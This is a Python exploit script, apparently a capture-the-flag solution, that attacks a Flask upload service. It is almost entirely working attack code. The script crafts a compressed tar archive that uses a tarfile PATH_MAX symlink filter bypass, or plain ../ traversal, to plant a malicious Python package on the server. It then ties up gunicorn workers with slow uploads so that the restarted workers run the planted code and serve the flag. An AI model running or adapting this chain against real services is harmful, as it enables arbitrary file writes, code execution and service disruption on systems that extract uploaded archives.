#!/usr/bin/env python3
"""
Exploit for The Real TARget.

Usage:
  python3 real_target_solve.py http://HOST:PORT

What it does:
  1. Builds a tiny bzip2-compressed tar archive. tarfile.open(..., mode='r')
     auto-detects bzip2 even when the uploaded filename is x.tar, so the
     compressed multipart body stays below Flask's 1KB MAX_CONTENT_LENGTH.
  2. Uses the Python tarfile PATH_MAX symlink filter-bypass pattern to write
     /app/app/__init__.py, creating an importable package named "app".
  3. Opens slow upload requests to occupy the 4 sync gunicorn workers. After
     gunicorn's default timeout, the master respawns workers, and fresh workers
     import our /app/app package instead of the original /app/app.py.
  4. Polls /flag and / until a restarted worker serves the flag.

If the remote was rebuilt on a fully patched Python where the tarfile PATH_MAX
filter bypass is fixed, step 2 will fail with a 500 response. Try --direct only
for locally vulnerable/no-filter deployments.
"""
from __future__ import annotations

import argparse
import bz2
import io
import os
import socket
import sys
import tarfile
import threading
import time
from urllib.parse import urlparse

import requests

COMP_LEN = 247
DEPTH = 16
LONG_COMP = "d" * COMP_LEN
PIVOT = "l" * 254

PAYLOAD = b"""from flask import*\nfrom glob import glob\napp=Flask(__name__)\n@app.get('/')\n@app.get('/flag')\ndef f():return open(glob('/flag-*')[0]).read()\n"""


def _add_file(tar: tarfile.TarFile, name: str, data: bytes, mode: int = 0o644) -> None:
    ti = tarfile.TarInfo(name)
    ti.type = tarfile.REGTYPE
    ti.mode = mode
    ti.size = len(data)
    tar.addfile(ti, io.BytesIO(data))


def _add_dir(tar: tarfile.TarFile, name: str, mode: int = 0o755) -> None:
    ti = tarfile.TarInfo(name)
    ti.type = tarfile.DIRTYPE
    ti.mode = mode
    tar.addfile(ti)


def _add_symlink(tar: tarfile.TarFile, name: str, linkname: str) -> None:
    ti = tarfile.TarInfo(name)
    ti.type = tarfile.SYMTYPE
    ti.linkname = linkname
    tar.addfile(ti)


def build_cve_write_archive() -> bytes:
    """Build bzip2-compressed tar that writes /app/app/__init__.py.

    This is a compact variation of the PATH_MAX symlink bypass:
      - create a deep directory path inside the extraction directory;
      - create `a -> <deep path>`;
      - create `<deep path>/<long pivot> -> ../../../...` returning to the
        extraction root;
      - create `escape -> a/<pivot>/../../../../../../../../app`.

    The filter's realpath() sees a path still starting inside the extraction
    directory after PATH_MAX is exceeded, while the kernel follows the symlink
    chain and creates /app/app/__init__.py.
    """
    deep = "/".join([LONG_COMP] * DEPTH)
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w") as tar:
        cur = ""
        for _ in range(DEPTH):
            cur = os.path.join(cur, LONG_COMP)
            _add_dir(tar, cur)

        _add_symlink(tar, "a", deep)
        _add_symlink(tar, f"{deep}/{PIVOT}", "../" * DEPTH)

        # From extraction root, lots of ../ reaches /, then /app.
        _add_symlink(tar, "escape", f"a/{PIVOT}/" + ("../" * 8) + "app")
        _add_dir(tar, "escape/app")
        _add_file(tar, "escape/app/__init__.py", PAYLOAD)

    return bz2.compress(raw.getvalue(), compresslevel=9)


def build_direct_traversal_archive() -> bytes:
    """Fallback for old/no-filter Python tarfile deployments."""
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w") as tar:
        _add_file(tar, "../../../app/__init__.py", PAYLOAD)
    return bz2.compress(raw.getvalue(), compresslevel=9)


def multipart_body(blob: bytes) -> tuple[bytes, dict[str, str]]:
    # Keep the body tiny. Filename must end in .tar for the Flask check.
    boundary = "x"
    body = (
        b"--x\r\n"
        b"Content-Disposition: form-data; name=\"file\"; filename=\"x.tar\"\r\n"
        b"Content-Type: application/x-tar\r\n\r\n"
        + blob
        + b"\r\n--x--\r\n"
    )
    headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
    return body, headers


def post_tar(base: str, blob: bytes, timeout: float = 8.0) -> requests.Response:
    body, headers = multipart_body(blob)
    print(f"[*] compressed tar size={len(blob)} bytes, multipart body={len(body)} bytes")
    if len(body) >= 1024:
        print("[!] body is >= 1024 bytes; Flask MAX_CONTENT_LENGTH may reject it")
    return requests.post(base.rstrip("/") + "/untar", data=body, headers=headers, timeout=timeout)


def slow_upload_once(base: str, hold: int) -> None:
    u = urlparse(base)
    host = u.hostname or "127.0.0.1"
    port = u.port or (443 if u.scheme == "https" else 80)
    if u.scheme == "https":
        print("[!] slow restart helper only implements plain HTTP sockets; use HTTP/nginx endpoint")
        return

    try:
        s = socket.create_connection((host, port), timeout=5)
        req = (
            f"POST /untar HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: multipart/form-data; boundary=x\r\n"
            f"Content-Length: 100000000\r\n"
            f"Connection: close\r\n\r\n"
            f"--x\r\nContent-Disposition: form-data; name=\"file\"; filename=\"x.tar\"\r\n\r\n"
        ).encode()
        s.sendall(req)
        # Dribble one byte occasionally so nginx/gunicorn keeps the request open.
        end = time.time() + hold
        while time.time() < end:
            try:
                s.sendall(b"A")
            except OSError:
                break
            time.sleep(5)
    except Exception:
        pass
    finally:
        try:
            s.close()
        except Exception:
            pass


def restart_workers(base: str, workers: int, hold: int) -> None:
    print(f"[*] occupying {workers} gunicorn workers with slow uploads")
    threads = []
    for _ in range(workers):
        t = threading.Thread(target=slow_upload_once, args=(base, hold), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.2)
    for t in threads:
        t.join(timeout=hold + 2)


def poll_flag(base: str, attempts: int = 80) -> str | None:
    sess = requests.Session()
    for i in range(attempts):
        for path in ("/flag", "/"):
            try:
                r = sess.get(base.rstrip("/") + path, timeout=4)
                text = r.text.strip()
                if r.status_code == 200 and ("{" in text and "}" in text):
                    print(f"[+] got response from {path}: {text}")
                    return text
                if i % 10 == 0:
                    print(f"[*] {path}: HTTP {r.status_code} {text[:60]!r}")
            except Exception as e:
                if i % 10 == 0:
                    print(f"[*] poll error: {e}")
        time.sleep(1)
    return None


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("url", help="base URL, e.g. http://127.0.0.1:5555")
    ap.add_argument("--direct", action="store_true", help="use classic ../../../ traversal instead of PATH_MAX CVE")
    ap.add_argument("--workers", type=int, default=4)
    ap.add_argument("--hold", type=int, default=40, help="seconds to hold slow uploads")
    args = ap.parse_args()

    blob = build_direct_traversal_archive() if args.direct else build_cve_write_archive()
    r = post_tar(args.url, blob)
    print(f"[*] upload result: HTTP {r.status_code} {r.text[:200]!r}")
    if r.status_code >= 500:
        print("[!] extraction failed. If this is the official patched Python image, the CVE route is fixed.")

    restart_workers(args.url, args.workers, args.hold)
    flag = poll_flag(args.url)
    if flag:
        print(flag)
        return 0
    print("[-] no flag yet. Re-run the script or increase --hold/--workers if workers did not all restart.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
